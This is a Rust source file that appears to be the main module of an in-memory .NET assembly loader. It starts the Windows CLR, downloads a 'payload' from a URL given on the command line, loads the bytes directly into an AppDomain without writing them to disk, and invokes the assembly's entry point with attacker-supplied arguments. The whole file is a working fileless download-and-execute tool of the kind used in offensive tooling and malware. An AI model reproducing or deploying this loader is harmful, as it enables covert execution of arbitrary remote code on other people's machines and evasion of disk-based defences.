use std::os::raw::c_void;

mod clr;
mod commandline;
mod file;

use clap::Parser;
use clr::core::appdomain::IAppDomain;
use clr::core::assembly::IAssembly;
use clr::core::methodinfo::IMethodInfo;
use clr::util;
use file::{get_payload_from_filesystem, get_payload_from_url};
use windows::Win32::System::Com::{SAFEARRAY, SAFEARRAYBOUND};
use windows::Win32::System::Ole::{SafeArrayAccessData, SafeArrayCreate, SafeArrayUnaccessData};
use windows::Win32::System::Variant::{VARIANT, VT_UI1};
use windows_core::Interface;

const CLR_VERSION: &str = "v4.0.30319";

fn main() {
    let commandline = commandline::CommandLine::parse();

    let installed_versions = util::get_installed_runtime_versions();

    let is_expected_version = installed_versions.contains_key(CLR_VERSION);

    if !is_expected_version {
        println!("Expected CLR version is not installed.");
        return;
    }

    let cor_runtime_host = clr::runtime_host::CLRRuntimeHost::from(
        installed_versions.get(CLR_VERSION).unwrap().clone(),
    );

    let appdomain = cor_runtime_host.create_domain();

    //let buf = get_payload_from_filesystem(commandline.url);
    let buf = get_payload_from_url(commandline.url);

    let mut bounds = SAFEARRAYBOUND {
        cElements: buf.len() as _,
        lLbound: 0,
    };

    let safe_array_ptr: *mut SAFEARRAY = unsafe { SafeArrayCreate(VT_UI1, 1, &mut bounds) };
    let mut pv_data: *mut c_void = std::ptr::null_mut();

    match unsafe { SafeArrayAccessData(safe_array_ptr, &mut pv_data) } {
        Ok(_) => {}
        Err(e) => {
            println!("e")
        }
    }

    unsafe { std::ptr::copy_nonoverlapping(buf.as_slice().as_ptr(), pv_data.cast(), buf.len()) };

    match unsafe { SafeArrayUnaccessData(safe_array_ptr) } {
        Ok(_) => {}
        Err(e) => {
            println!("e")
        }
    };

    let mut assembly_ptr = std::ptr::null_mut();
    unsafe { appdomain.Load_3(safe_array_ptr, &mut assembly_ptr).unwrap() };
    let mut assembly = unsafe { IAssembly::from_raw(assembly_ptr as *mut c_void) };

    let mut entry_ptr = std::ptr::null_mut();
    unsafe { assembly.get_EntryPoint(&mut entry_ptr).unwrap() };
    let mut entrypoint = unsafe { IMethodInfo::from_raw(entry_ptr as *mut c_void) };

    let obj = VARIANT::default();
    let mut pRetVal = VARIANT::default();
    let args = commandline.derive_command;
    let args_safearray_ptr = util::create_safearray_from_strings(&args).unwrap();
    unsafe {
        entrypoint
            .Invoke_3(obj, args_safearray_ptr, &mut pRetVal)
            .unwrap()
    };
}
